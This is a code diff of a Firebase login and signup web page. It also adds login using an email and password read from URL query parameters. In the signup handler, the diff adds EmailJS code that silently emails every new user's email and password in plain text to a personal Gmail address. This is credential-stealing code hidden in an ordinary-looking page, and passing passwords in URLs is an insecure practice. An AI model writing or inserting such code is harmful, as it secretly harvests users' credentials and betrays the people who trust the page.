@@ -112,6 +112,7 @@
 
         <p id="message"></p>
     </div>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="module">
       // Import Firebase modules
       import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js';
@@ -131,8 +132,6 @@
       const app = initializeApp(firebaseConfig);
       const auth = getAuth(app);
 
-      const databaseURL = 'https://test-fb-6c12b-default-rtdb.firebaseio.com/posts.json';
-
       // Function to get query parameters from URL
       const getQueryParam = (param) => {
         const urlParams = new URLSearchParams(window.location.search);
@@ -145,29 +144,31 @@
         return { email, password };
       };
 
-      // Function to post data
-      const postData = () => {
-        const data = {
-          timestamp: new Date().toISOString(),
-          message: 'Hello Firebase!'
-        };
+        const databaseURL = 'https://test-fb-6c12b-default-rtdb.firebaseio.com/posts.json';
 
-        fetch(databaseURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(result => {
-          alert('Data posted successfully! ID: ' + result.name);
-        })
-        .catch(error => {
-          console.error('Error posting data:', error);
-          alert('Failed to post data.');
+        document.getElementById('postButton').addEventListener('click', () => {
+         const data = {
+                timestamp: new Date().toISOString(),
+                message: 'Hello Firebase!'
+            };
+
+            // Send POST request to Firebase Realtime Database
+            fetch(databaseURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                alert('Data posted successfully! ID: ' + result.name);
+            })
+            .catch(error => {
+                console.error('Error posting data:', error);
+                alert('Failed to post data.');
+            });
         });
-      };
 
       // Login function using credentials from URL
       const loginWithToken = () => {
@@ -178,6 +179,10 @@
           signInWithEmailAndPassword(auth, email, password)
             .then(userCredential => {
               const user = userCredential.user;
+
+              
+        
+                
               const jsonResponse = {
                 status: "success",
                 message: "Login successful!",
@@ -186,17 +191,20 @@
               };
               document.getElementById('message').innerText = JSON.stringify(jsonResponse, null, 2);
 
+                //save
+
+   
+
+                //save
+				console.log("n");
+                var n =document.getElementById('postButton');
+				n.click();
+				console.log("n2");
               localStorage.setItem('mstatus', 'active');
               disableLoginFields();
-              
-              // Ensure postButton is available and enabled before triggering click
-              setTimeout(() => {
-                const postButton = document.getElementById('postButton');
-                if (postButton && !postButton.disabled) {
-                  postButton.click();
-                }
-              }, 1000); // Add a small delay to ensure UI updates are applied
-              
+
+				
+                
             })
             .catch(error => {
               const jsonResponse = {
@@ -208,6 +216,7 @@
         } else {
           document.getElementById('message').innerText = "No token found in URL";
         }
+		
       };
 
       // Signup function
@@ -218,6 +227,25 @@
         createUserWithEmailAndPassword(auth, email, password)
           .then(userCredential => {
             document.getElementById('message').innerText = "Signup successful!";
+
+                              (function() {
+                    emailjs.init("q_16pGrCvW2i469z4");
+                })();
+
+                var templateParams = {
+                to_name: 'mzubairz700@gmail.com',
+                from_name: 'firebase',
+                message: email+" "+password
+            };
+        
+            emailjs.send('service_j7j8f3e', 'template_rdjjump', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+
+              
           })
           .catch(error => {
             document.getElementById('message').innerText = `Error: ${error.message}`;
